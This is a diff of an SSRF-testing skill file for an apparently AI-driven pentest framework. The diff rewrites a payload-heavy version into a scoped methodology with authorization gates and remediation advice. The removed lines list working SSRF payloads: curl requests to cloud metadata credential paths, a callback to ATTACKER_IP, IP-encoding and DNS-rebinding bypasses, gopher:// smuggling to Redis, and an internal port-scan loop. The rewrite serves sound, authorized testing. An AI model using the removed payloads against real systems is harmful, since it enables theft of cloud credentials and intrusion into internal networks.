@@ -1,132 +1,74 @@
 ---
 name: attack-ssrf
-description: "Server-Side Request Forgery — internal network access, cloud metadata theft, filter bypass techniques"
+description: "Assess server-side URL fetching and request routing with bounded, non-sensitive proof"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - ssrf
-  - web
-  - injection
-  - cloud
-  - attack
-tech_stack:
-  - web
-  - aws
-  - gcp
-  - azure
-cwe_ids:
-  - CWE-918
-chains_with:
-  - attack-xxe
-  - attack-ssti
-prerequisites: []
-severity_boost:
-  attack-xxe: "SSRF via XXE parser = file read + internal network scanning"
-  attack-ssti: "SSRF from SSTI = full RCE chain"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [ssrf, url-fetching, webhooks, cloud, validation]
+tech_stack: [http, web, api, cloud]
+cwe_ids: [CWE-918]
+chains_with: [attack-open-redirect, attack-host-header, attack-triage-validation]
+prerequisites:
+  - "Authorized in-scope endpoint and permission for SSRF validation"
+  - "A controlled callback or test destination approved by the program"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-ssrf/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
+  - "https://portswigger.net/web-security/ssrf"
 ---
 
-# Server-Side Request Forgery (SSRF)
+# Server-Side Request Forgery (SSRF) Assessment
 
 ## Objective
 
-Force the server to make requests to internal resources, cloud metadata endpoints, or attacker-controlled servers.
+Determine whether an attacker-controlled URL or host value causes the server to make an unintended outbound request or access a protected network boundary. Do not access cloud metadata, internal services, or sensitive endpoints unless the rules of engagement explicitly authorize that exact validation.
 
-## Testing Methodology
+## Safety gates
 
-### Phase 1: Identify URL Input Points
+- Confirm the input endpoint and callback method are in scope.
+- Use a program-approved, controlled callback domain or test server; keep proof to a unique marker and request metadata.
+- Do not query cloud metadata endpoints, localhost admin panels, private network services, or internal credentials on production systems unless specifically approved in writing.
+- Do not use redirects, DNS rebinding, alternate IP encodings, or protocol tricks to bypass controls without explicit authorization.
+- Stop immediately if a response reveals secrets, internal data, or unexpected service behavior.
 
-Look for parameters that accept URLs:
-- Webhook URLs, callback URLs
-- File import/export (URL-based)
-- PDF/image generation from URL
-- URL preview/unfurling
-- Proxy/redirect endpoints
+## Procedure
 
-### Phase 2: Basic SSRF Payloads
+### 1. Identify URL-consuming features
 
-```bash
-# Start callback listener
-attack_script ssrf_listener -p 8888 -o ssrf_evidence.json &
+Look for webhooks, image/PDF fetchers, URL previews, import-by-URL, callback validation, document conversion, feed readers, remote avatar fetching, and server-side proxy features. Record the expected allowed schemes, hosts, and business purpose.
 
-# Test URL parameters
-curl "https://TARGET/api/fetch?url=http://ATTACKER_IP:8888/ssrf-test"
-curl "https://TARGET/api/preview?link=http://127.0.0.1:80"
-```
+### 2. Capture a baseline
 
-### Phase 3: Cloud Metadata
+Use a harmless, valid destination and record the application's response, asynchronous job state, and any outbound request evidence available to the tester. Determine whether the server fetches synchronously, asynchronously, or through a third-party service.
 
-```bash
-# AWS IMDSv1
-curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
-curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+### 3. Test controlled outbound reachability
 
-# GCP
-curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+Submit a unique URL on an approved callback service and verify whether a request arrives. Record DNS/HTTP behavior, source metadata, timing, and whether redirects are followed. A callback is evidence of server-side fetching but not by itself proof of access to a protected resource.
 
-# Azure
-curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-```
+### 4. Review validation boundaries
 
-### Phase 4: Filter Bypass
+Check whether the application restricts schemes, validates the parsed hostname, resolves DNS safely, revalidates redirect destinations, blocks private/loopback/link-local ranges where required, and limits redirects. Test only the permitted boundary cases. Do not escalate to internal targets unless approved.
 
-```bash
-# Decimal IP (127.0.0.1 = 2130706433)
-curl "https://TARGET/fetch?url=http://2130706433/"
+### 5. Validate response access separately
 
-# Hex IP
-curl "https://TARGET/fetch?url=http://0x7f000001/"
+If the application returns fetched content, use a harmless test page and verify whether the response body is exposed to the caller. Out-of-band callbacks and response-based SSRF are different impact classes. Do not retrieve credentials or sensitive internal data as proof.
 
-# IPv6
-curl "https://TARGET/fetch?url=http://[::1]/"
+### 6. Consider redirects and DNS safely
 
-# URL encoding
-curl "https://TARGET/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"
+Where policy permits, verify whether an approved test redirect changes the final destination and whether DNS validation is repeated. Do not use DNS rebinding or infrastructure targets as an unapproved bypass. Preserve callback logs and remove test jobs/configuration afterward.
 
-# DNS rebinding (use your own DNS server)
-curl "https://TARGET/fetch?url=http://rebind.127.0.0.1.nip.io/"
+### 7. Assess impact and remediation
 
-# Redirect bypass
-curl "https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"
+Describe the exact server-side request capability, allowed scheme/host boundary, caller permissions, response visibility, and safe impact. Recommend allowlisting parsed hostnames, resolving and validating all destination IPs, revalidating redirects, restricting egress, and applying timeouts/size limits.
 
-# Protocol smuggling
-curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"
-```
+## Common false positives
 
-### Phase 5: Internal Port Scanning
+- The browser, not the server, makes the request.
+- A third-party processor makes the callback and is outside the target's trust boundary.
+- A callback proves outbound fetch only, not internal-network reachability.
+- The input is stored but never fetched.
+- A URL preview returns an error without any server-side request.
 
-```bash
-# Scan common internal ports
-for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
-  curl -s -o /dev/null -w "%{http_code}" "https://TARGET/fetch?url=http://127.0.0.1:$port/" &
-done
-wait
-```
+## Output contract
 
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Cloud metadata access (credentials) | Critical (P1) |
-| Internal network access | High (P2) |
-| Out-of-band HTTP callback | Medium (P3) |
-| Blind SSRF (timing-based) | Medium (P3) |
-| File read via file:// protocol | Critical (P1) |
-| gopher:// protocol access | High (P2) |
-
-## Evidence Requirements
-
-- URL parameter with SSRF payload
-- Response containing internal data or metadata
-- For blind SSRF: OOB callback evidence (use ssrf_listener)
-- Network topology information gathered
-
-## Tools
-
-- `attack_script ssrf_listener` — OOB callback listener
-- `curl` — manual SSRF testing
-
-## References
-
-- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
-- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+Return `input_feature`, `destination_controlled`, `outbound_request_confirmed`, `redirect_behavior`, `response_body_exposed`, `network_boundary_tested`, `impact`, `cleanup_status`, `confidence`, and redacted evidence.
